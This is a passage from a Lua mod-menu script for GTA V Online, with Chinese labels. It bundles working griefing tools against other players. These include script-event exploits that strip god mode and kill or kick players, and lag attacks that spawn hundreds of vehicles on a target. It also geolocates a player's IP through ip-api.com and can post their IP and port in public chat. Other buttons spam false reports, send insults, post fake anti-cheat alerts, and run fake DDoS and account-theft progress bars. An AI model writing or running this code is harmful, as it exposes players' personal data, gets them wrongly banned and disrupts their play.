                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("精神小伙提醒你:玩家不在载具中")
            menu.set_value(control_veh, false)
        end
        util.yield()
        
    end)
    menu.toggle_loop(zaijuegao, "禁用载具", {}, "", function(toggle)
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
    if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
    else
        local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
        entities.delete_by_handle(veh2)
    end
    end)
    menu.toggle_loop(zaijuegao, "载具吸附",{""}, "将附近载具吸到他身上", function()
        local p_c = players.get_position(PlayerID)
        for _, v in pairs(entities.get_all_vehicles_as_handles()) do 
            if not PED.IS_PED_A_PLAYER(VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1, false)) then 
                local v_c = ENTITY.GET_ENTITY_COORDS(v)
                local c = {}
                c.x = (p_c.x - v_c.x)*2
                c.y = (p_c.y - v_c.y )*2
                c.z = (p_c.z - v_c.z)*2
                ENTITY.APPLY_FORCE_TO_ENTITY(v, 1, c.x, c.y, c.z, 0, 0, 0, 0, false, false, true, false, false)
            end
        end
    end) 
local online_player = menu.list(bozo, "线上选项", {}, "")
    local cherter = menu.list(online_player, "反无敌(被动)选项", {}, "使用魔法打败魔法~")
    menu.action(cherter, "杀死无敌玩家V1", {"stun"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)   
    menu.action(cherter, "杀死无敌玩家V2", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local khanjali = util.joaat("khanjali")
        request_model(khanjali)
        if TASK.IS_PED_STILL(ped) then
            distance = 0.0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 2.0
        end
        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, distance, 2.8), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, pos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0.0, 3.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end) 
    menu.action(cherter, "杀死被动玩家", {}, "", function()
        local coords = players.get_position(PlayerID)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        coords.z = coords.z + 5
        local playerCar = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
        if playerCar > 0 then
            entities.delete_by_handle(playerCar)
        end
        local carHash = util.joaat("dukes2")
        request_model(carHash)
        local car = entities.create_vehicle(carHash, coords, 0)
        ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
        ENTITY.APPLY_FORCE_TO_ENTITY(car, 1, 0.0, 0.0, -65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
    end)
    menu.action(cherter, "死亡屏障击杀", {}, "", function()
        Death_barrier(PlayerID)
    end)
    menu.toggle_loop(cherter,"移除玩家无敌V1", {}, "被大多数菜单所拦截", function()
        util.trigger_script_event(1 << PlayerID, {0xAD36AA57, PlayerID, 0x96EDB12F, math.random(0, 0x270F)})
    end)
    player_toggle_loop(cherter, PlayerID, "移除载具无敌", {}, "被大多数菜单所拦截.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
        end
    end)
    menu.toggle_loop(cherter,"炸死无敌玩家", {"Alty"}, "被大多数菜单拦截", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {0xAD36AA57, PlayerID, 0x96EDB12F, math.random(0, 0x270F)})
            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
        end
    end)
local duirenchats = menu.list(online_player, "语言公鸡", {}, "使用语言攻击~")
yuyangongji = filesystem.stand_dir().."\\Lua Scripts\\lib\\YeMulib"
menu.action(duirenchats, "更改语言攻击内容",{""}, "记事本打开文件夹中的YMcu文件，编辑内容即可", function()
util.open_folder(yuyangongji)
end)
    menu.divider(duirenchats, "语言公鸡")
    menu.action(duirenchats, "公鸡1", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing1,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡2", {""}, "公屏上骂他", function()
        chat.send_message(cussing2..PLAYER.GET_PLAYER_NAME(PlayerID)..cussing2_1,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡3", {""}, "公屏上骂他", function()
        chat.send_message(cussing3 ..PLAYER.GET_PLAYER_NAME(PlayerID),false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡4", {""}, "公屏上骂他", function()
        chat.send_message(cussing4 ..PLAYER.GET_PLAYER_NAME(PlayerID)..cussing4_1,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡5", {""}, "公屏上骂他", function()
        chat.send_message(cussing5,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡6", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing6,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡7", {""}, "公屏上骂他", function()
        chat.send_message(cussing7,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡8", {""}, "公屏上骂他", function()
        chat.send_message(cussing8,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡9", {""}, "公屏上骂他", function()
        chat.send_message(cussing9,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡10", {""}, "公屏上骂他", function()
        chat.send_message(cussing10,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡11", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing11,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡12", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing12,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡13", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing13,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡14", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing14,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(duirenchats, "公鸡15", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing15,false,true,true)
    end)
    menu.action(duirenchats, "超级公鸡", {""}, "骂死他", function()
      local notification = b_notifications.new()
      notification.notify("你好陌生人！","游戏并非只有制裁，更多的是带给其他人快乐，希望可以给其他玩家一个好的游戏体验！")
      YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinu.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 6 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound4.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
chat.send_message("夜幕提醒:"..PLAYER.GET_PLAYER_NAME(PlayerID).."请为各位玩家创造一个良好的游戏环境，游戏并非吵架而是放松\n.Nightfall reminds everyone: please create a good game environment for all players, the game is not a fight but a relaxation", false, true, true)
end)
local chattrolls_root = menu.list(online_player, "西普肉的虚假检测", {}, "")
    menu.action(chattrolls_root, "虚假的XIPRO检测1", {}, "用户触发XIPRO检测：Rockstar反作弊 (C1)""\nRID:" ..players.get_rockstar_id(PlayerID), function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('>玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro Max玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."----¦XiPro Max", false, true, true)
    end)
    menu.action(chattrolls_root, "虚假XIPRO检测崩溃2", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('>玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro Max玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."----¦XiPro Max", false, true, true)
    end)
    menu.action(chattrolls_root, "虚假XIPRO检测崩溃3", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."", false, true, true)
    end)
        menu.action(chattrolls_root, "虚假XIPRO检测崩溃4", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'无效处理类型', '无效模型崩溃', '无效踢出类型', '无效虚假类型', '脚本事件崩溃v1', '脚本事件崩溃v2', '脚本事件崩溃v3'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('<XiPro警告> ' .. det_type ..  " | 来自玩家: "  .. players.get_name(PlayerID) .."", false, true, true)
    end)
    menu.action(online_player,"无限黑屏",{},"",function ()
        menu.trigger_commands("infiniteloading".. PLAYER.GET_PLAYER_NAME(PlayerID))
    end)
    Pifn = menu.list(online_player, "玩家信息", {}, "IP查询~")
    menu.action(Pifn, "本地查询玩家信息", {}, "本地查询玩家信息", function(IP)
    notification("[夜幕提示]查询中...不要着急啦", colors.black)
    local IP = intToIp(players.get_connect_ip(PlayerID))
    async_http.init("http://ip-api.com","/json/"..IP .. "?lang=zh-CN",function(info,header,response)
        if response == 200  then
            local IPtable = StrToTable(info)
            if IPtable.status == "success" then
                local str = "~y~玩家:~w~"..PLAYER.GET_PLAYER_NAME(PlayerID)..
                            "\n~y~RID: ~w~"..players.get_rockstar_id(PlayerID)..
                            "\n~y~IP:~w~"..intToIp(players.get_ip(PlayerID))..
                            "\n~y~国家: ~w~" .. IPtable.country .. 
                            "\n~y~国家代码: ~w~" .. IPtable.countryCode .. 
                            "\n~y~区域: ~w~" .. IPtable.region .. 
                            "\n~y~区域名称: ~w~" .. IPtable.regionName ..
                            "\n~y~城市: ~w~" .. IPtable.city .. 
                            "\n~y~邮政编码: ~w~" .. IPtable.zip .. 
                            "\n~y~ISP: ~w~" .. IPtable.isp .. 
                            "\n~y~时区: ~w~" .. IPtable.timezone
                notification(str, colors.black)
            end
        end
    end)
    async_http.dispatch()
    end)
    menu.action(Pifn, "公开此玩家信息", {}, "发布到公屏", function()
       chat.send_message("玩家"..PLAYER.GET_PLAYER_NAME(PlayerID)..": "..
       "\nRID: "..players.get_rockstar_id(PlayerID)..
       "\nIP:"..intToIp(players.get_ip(PlayerID))..
       "\n端口:"..(players.get_port(PlayerID)),false,true,true)
    end)
    local tp_player = menu.list(bozo, "传送玩家到...", {}, "")
    local interior_tps = {
        [70] = "地堡", -- 70 到 80 都是地堡
        [81] = "机动作战中心",
        [83] = "机库", -- 83 到 87 都是机库
        [88] = "复仇者",
        [89] = "设施", -- 89 到 97 都是设施
        [102] = "夜总会车库",-- 102 到 111 都是夜总会车库
        [117] = "恐霸",
        [122] = "竞技场工作室",
        [123] = "名钻赌场",
        [124] = "顶层公寓",
        [128] = "游戏厅车库", -- 128 到 133 都是游戏厅车库
        [146] = "夜总会",
        [147] = "虎鲸",
        [149] = "改装铺", -- 149 到 153 都是改装铺
        [155] = "事务所",
    }
    menu.action(tp_player,"佩里科岛", {}, "", function()
        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " on") 
        repeat
            if tp_timer > 10 then
                return
            end
            tp_timer += 1
            util.yield(1000)
        until players.get_boss(players.user()) != -1
        local pos = players.get_position(players.user())
        local player_pos = players.get_position(PlayerID)
        SET_ENTITY_VISIBLE(players.user_ped(), false)
        util.yield(100)
        for i   = 0, 10 do
            SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos, false, false, false)
            util.trigger_script_event(1 << PlayerID, {1669592503, players.user(), 0, 0, 3, 1})
            util.yield(100)
        end
        SET_ENTITY_VISIBLE(players.user_ped(), true)
        SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " off")
    end)

    local tp_timer = 0
    menu.action(tp_player,"韦斯普奇海滩", {}, "", function()
        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " on") 
        repeat
            if tp_timer > 10 then
                return
            end
            tp_timer += 1
            util.yield(1000)
        until players.get_boss(players.user()) != -1
        local pos = players.get_position(players.user())
        local player_pos = players.get_position(PlayerID)
        SET_ENTITY_VISIBLE(players.user_ped(), false)
        util.yield(100)
        for i   = 0, 10 do
            SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos, false, false, false)
            util.trigger_script_event(1 << PlayerID, {1669592503, players.user(), 0, 0, 4, 0})
            util.yield(100)
        end
        SET_ENTITY_VISIBLE(players.user_ped(), true)
        SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " off")
    end)

    for id, name in interior_tps do
        menu.action(tp_player,name, {""}, lang.get_localised(-748077967), function()
            util.trigger_script_event(1 << PlayerID, {-1638522928, players.user(), id, 1, 0, 1, 1130429716, -1001012850, 1106067788, 0, 0, 1, 2123789977, 1, -1})
        end)
    end
    local cpu = menu.list(bozo, "电脑选项", {}, "崩不过就用物理方法搞他")
    menu.action(cpu,"CPU卡机", {}, "让他卡", function() 
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		notification("要开始喽！", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("结束！", colors.green) 
		menu.trigger_commands("anticrashcamera off")
		util.yield(5000)
	end)
    menu.action(cpu, "DDoS攻击", {}, "通过向玩家的路由器发送数据包进行DDoS攻击", function()
        util.toast("成功发送DDoS攻击到 " ..players.get_name(PlayerID))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("DDos失败，请不要重试~")
    end)
    menu.action(cpu, "获取账户信息", {}, "获取玩家的帐户信息，格式：电子邮件：密码", function()
       util.toast("开始获取账户信息 " ..players.get_name(PlayerID))
        local percent = 0
        while percent <= 100 do
            util.yield(800)
            util.toast(percent.. "%")
            percent = percent + 1
        end
        util.yield(2500)
        util.toast("获取失败，请不要重试~")
    end)
    menu.toggle(cpu,"循环举报", {}, "让他封号", function(on)
        spam = on
        while spam do
            if PlayerID ~= players.user() then
                menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(PlayerID))
            end
            util.yield()
        end
    end)
    require"lib.YeMulib.YeMulib"
    player_removals = menu.list(bozo, "移除玩家(含掉帧)", {"Rem"}, "", function();end)
    menu.set_visible(player_removals, false)

    rem1 = menu.action(bozo, "移除玩家(含掉帧)", {""}, "", function()
        local name = PLAYER.GET_PLAYER_NAME(PlayerID)
        for _, id in ipairs(YMth) do
            if name == id.playerid then
                util.toast("此玩家为夜幕VIP用户")
                menu.trigger_commands("YMScript" .. PLAYER.GET_PLAYER_NAME(PlayerID))
                break
            else
                menu.trigger_commands("Rem" .. PLAYER.GET_PLAYER_NAME(PlayerID))
            end
        end
    end)

    menu.divider(player_removals, "踢出")   
    menu.action(player_removals, "STAND本体智能踢出", {"kick"}, "", function()
        menu.trigger_commands("kick" .. players.get_name(PlayerID))
    end)
    menu.action(player_removals, "脚本事件踢出", {}, "", function()
       menu.trigger_commands("scripthost")
       menu.trigger_commands("nonhostkick".. PLAYER.GET_PLAYER_NAME(PlayerID))
    end)
menu.divider(player_removals, "掉帧")   
diaozhenxuanxiang = menu.list(player_removals, "掉帧选项", {}, "")
 menu.action(diaozhenxuanxiang,"货机掉帧", {"eg1"}, "", function() 
                 while not STREAMING.HAS_MODEL_LOADED(447548909) do
               STREAMING.REQUEST_MODEL(447548909)
             util.yield(10)
             end
                local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, -76, -819, 326, true, true, true)

                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
end)
    menu.toggle_loop(diaozhenxuanxiang, "掉帧Pro Max", {"Pro Max"}, "", function(on_toggle)
        if players.exists(PlayerID) then
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        local weap = util.joaat('weapon_firework')
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(PlayerID), "Trolling>Freeze")
            local player_pos = players.get_position(PlayerID)  
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local pos = ENTITY.GET_ENTITY_COORDS(ped)      
            menu.trigger_commands("shanta " .. players.get_name(PlayerID))
            menu.trigger_commands("xiaofangshuan " .. players.get_name(PlayerID))     
            if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) then
              util.trigger_script_event(1 << PlayerID, {0xAD36AA57, PlayerID, 0x96EDB12F, math.random(0, 0x270F)})
              FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
             end  
                 while not STREAMING.HAS_MODEL_LOADED(447548909) do
               STREAMING.REQUEST_MODEL(447548909)
             util.yield(10)
             end
                local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, -76, -819, 326, true, true, true)

                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
        WEAPON.REQUEST_WEAPON_ASSET(weap)
        for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + -1.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
                --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 2.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
                FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
                FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
        end
            stcnm(PlayerID)
            phonesoundcnm(PlayerID)
            if on_toggle then
                TpAllPeds(PlayerID)
            else
                TpAllPeds(PlayerID)
            end
            if on_toggle then
                TpAllVehs(PlayerID)
            else
                TpAllVehs(PlayerID)
            end
            Streamptfx('core')
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("scr_sum2_hal")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
            wait(1000)
        end
    end)
    menu.divider(player_removals, "崩溃")
    collapse1 = menu.list(player_removals, "组合崩溃(1)", {}, "夜幕全新组合崩溃")
    menu.divider(collapse1, "夜幕组合崩溃1")
